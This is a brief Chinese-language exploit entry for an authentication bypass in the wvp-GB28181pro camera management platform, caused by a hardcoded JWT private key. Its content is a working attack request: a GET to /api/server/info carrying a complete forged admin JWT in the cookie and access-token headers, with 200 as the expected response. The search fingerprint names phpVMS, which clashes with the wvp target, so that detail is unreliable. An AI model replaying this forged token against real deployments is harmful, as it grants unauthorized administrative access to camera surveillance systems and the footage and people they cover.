# wvp-GB28181pro摄像头管理平台info硬编码JWT私钥导致未授权访问漏洞

- **系统**：wvp　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app="phpVMS"`
- **请求**：`GET /api/server/info HTTP/1.1`
- **关键头**：`Cookie: wvp_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjNlNzk2NDZjNGRiYzQwODM4M2E5ZWVkMDlmMmI4NW…`　`access-token: eyJhbGciOiJSUzI1NiIsImtpZCI6IjNlNzk2NDZjNGRiYzQwODM4M2E5ZWVkMDlmMmI4NWFlIiwidHlwIjoiSldUIn0.eyJhdWQiOiJBdWRpZW5jZSIsImV4cCI6MTgxMDcwMzE3NSwiaWF0IjoxNzc5MTY3MTc1LCJqdGkiOiJmYWtlLWp3dC1pZC0xMjM0NSIsIm5iZiI6MTc3OTE2NzE3NSwic3ViIjoibG9naW4iLCJ1c2VyTmFtZSI6ImFkbWluIn0.NHI8RIz3oxRjg8AqyinkDmr6xLtZuEYMuI4mR8M85PMwPt_pFpV1TDze_UJP7LivZsc1CMC9XjlVNEcjvpNDQrx2oO6X5WX6iGjvAD6yAH-t3Zjr9py4ApBCrvGhq5m-jVe9j_H9t1H1h783A_WHD471-YiCTLDv6e5V8CmOwEnrl9Pa1kJJOaiEPTQk28M_SHiftd3IC-S_-y4RGDUKl6jJMOSEtcImvLlg1CIWzXnw1cYpBRKlnk5zgdlxcfB2rtaRgVaQaVOVSjziXS86JFs-gHY1ybvWfSC_K4qE4sMQufggN0yacvb330EOwmoXBgGaj_070ybYj7141aVBbg`
- **预期**：200　|　—